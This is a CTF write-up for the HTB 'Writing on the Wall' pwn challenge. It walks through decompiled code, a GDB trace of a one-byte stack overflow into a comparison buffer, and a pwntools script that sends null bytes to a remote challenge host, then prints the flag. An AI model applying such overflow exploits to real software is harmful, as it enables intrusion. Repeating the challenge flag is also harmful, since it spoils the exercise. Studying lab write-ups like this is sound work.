solved by vulnx https://github.com/VulnX

chall files:
[pwn_writing_on_the_wall.zip](./pwn_writing_on_the_wall.zip)

# Analysis

On reversing with ghidra we get the following source:

```c
undefined8 main(void)

{
  int iVar1;
  long in_FS_OFFSET;
  char local_1e [6];
  undefined8 local_18;
  long canary;

  canary = *(long *)(in_FS_OFFSET + 0x28);
  local_18 = 0x2073736170743377;
  read(0,local_1e,7);
  iVar1 = strcmp(local_1e,(char *)&local_18);
  if (iVar1 == 0) {
    open_door();
  }
  else {
    error("You activated the alarm! Troops are coming your way, RUN!\n");
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

```c
void open_door(void)

{
  ssize_t sVar1;
  long in_FS_OFFSET;
  char local_15;
  int local_14;
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_14 = open("./flag.txt",0);
  if (local_14 < 0) {
    perror("\nError opening flag.txt, please contact an Administrator.\n");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  printf("You managed to open the door! Here is the password for the next one: ");
  while( true ) {
    sVar1 = read(local_14,&local_15,1);
    if (sVar1 < 1) break;
    fputc((int)local_15,stdout);
  }
  close(local_14);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Our task is simple, get `strcmp(local_1e,(char *)&local_18)` to return 0, then we unlock the door and get the flag. `local_1e` is our input and `local_18` is the buffer ( 'w3tpass ' ).

However its not that simple:

```c
read(0,local_1e,7);
```

It only takes 7 bytes from input and compares it with an 8 byte string ( 'w3tpass ' ), so its practically impossible to get the condition true.

# Vulnerability

However if you set a breakpoint at `main+71` and run the binary with GDB and give it `1234567` as the input, you will get this:

```
0x00005555555555a6 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────
*RAX  0x7fffffffdafa ◂— '12345673tpass '
 RBX  0x0
 RCX  0x7ffff7d147e2 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x7fffffffdb00 ◂— '73tpass '
 RDI  0x0
 RSI  0x7fffffffdafa ◂— '12345673tpass '
 R8   0x5555555592a0 ◂— 0x555555559
 R9   0x7fffffff
 R10  0x7ffff7fc3908 ◂— 0xd00120000000e
 R11  0x246
 R12  0x7fffffffdc28 —▸ 0x7fffffffdf97 ◂— '/home/vulnx/Games/CTFs/Cyber Apocalypse/pwn/Writing on the Wall/challenge/writing_on_the_wall'
 R13  0x55555555555f (main) ◂— endbr64
 R14  0x555555557d48 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5555555552a0 (__do_global_dtors_aux) ◂— endbr64
 R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
 RBP  0x7fffffffdb10 ◂— 0x1
 RSP  0x7fffffffdaf0 —▸ 0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
*RIP  0x5555555555a6 (main+71) ◂— mov rsi, rdx
─────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────
   0x55555555559e <main+63>    lea    rdx, [rbp - 0x10]
   0x5555555555a2 <main+67>    lea    rax, [rbp - 0x16]
 ► 0x5555555555a6 <main+71>    mov    rsi, rdx
   0x5555555555a9 <main+74>    mov    rdi, rax
   0x5555555555ac <main+77>    call   strcmp@plt                <strcmp@plt>

   0x5555555555b1 <main+82>    test   eax, eax
   0x5555555555b3 <main+84>    jne    main+98                <main+98>

   0x5555555555b5 <main+86>    mov    eax, 0
   0x5555555555ba <main+91>    call   open_door                <open_door>

   0x5555555555bf <main+96>    jmp    main+113                <main+113>

   0x5555555555c1 <main+98>    lea    rax, [rip + 0xb98]
──────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────
00:0000│ rsp         0x7fffffffdaf0 —▸ 0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
01:0008│ rax-2 rsi-2 0x7fffffffdaf8 ◂— 'ST12345673tpass '
02:0010│ rdx         0x7fffffffdb00 ◂— '73tpass '
03:0018│-008         0x7fffffffdb08 ◂— 0xc198f41d898a6100
04:0020│ rbp         0x7fffffffdb10 ◂— 0x1
05:0028│+008         0x7fffffffdb18 —▸ 0x7ffff7c29d90 ◂— mov edi, eax
06:0030│+010         0x7fffffffdb20 —▸ 0x7ffff7e1b803 (_IO_2_1_stdout_+131) ◂— 0xe1ca700000000000
07:0038│+018         0x7fffffffdb28 —▸ 0x55555555555f (main) ◂— endbr64
────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
```

We have our input in RDX and the source string in RAX. But look closely, the last byte of our input has overflowed to the first byte of source buffer:

```
'w3tpass ' -> '73tpass '
```

This means that, while we cannot make the two strings equal, we can control what the first byte of source string will be.

# Exploit

How about we set it to NULL? That would terminate the source string at length: 0.

If our input also contains the first byte as NULL, then even our string is terminated at length 0.

TL;DR if give it 7 NULL bytes then:

- first byte of our input: \x00

- first byte of source string: \x00

Hence both strings will become equal and we pass the condition check

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./writing_on_the_wall")

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h']

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("83.136.250.103", 52130)

    return r


def main():
    r = conn()

    # good luck pwning :)

    # gdb.attach(r, gdbscript='''
    #            b * main+71
    #            ''')

    r.send(p64(0))
    r.recvuntil(b'{')
    flag = r.recvuntil(b'}')[:-1].decode()
    print(f'FLAG: HTB{{{flag}}}')


if __name__ == "__main__":
    main()
```

```console
python solve.py                                                                                                                                         ─╯
[*] '/home/vulnx/Games/CTFs/Cyber Apocalypse/pwn/Writing on the Wall/challenge/writing_on_the_wall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./glibc/'
[+] Opening connection to 83.136.250.103 on port 52130: Done
FLAG: HTB{3v3ryth1ng_15_r34d4bl3}
[*] Closed connection to 83.136.250.103 port 52130
```

# Flag

`HTB{3v3ryth1ng_15_r34d4bl3}`